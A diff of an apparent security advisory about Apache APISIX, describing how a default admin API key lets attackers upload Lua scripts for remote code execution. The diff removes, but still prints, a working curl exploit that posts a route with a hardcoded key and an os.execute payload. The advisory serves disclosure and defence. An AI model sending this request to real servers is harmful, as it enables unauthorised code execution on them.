@@ -21,13 +21,7 @@ API and perform any administrative action, including uploading arbitrary Lua
 scripts via the `script` parameter of route objects.
 
 Because Lua scripts execute server-side with the privileges of the APISIX
-process, an attacker can achieve full Remote Code Execution:
-
-```bash
-curl -X POST http://target:9080/apisix/admin/routes \
-  -H 'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1' \
-  -d '{"uri":"/pwn","script":"os.execute(\"id > /tmp/pwned\")"}'
-```
+process, an attacker can achieve full Remote Code Execution.
 
 ## Affected Service
 - **Service:** Apache APISIX
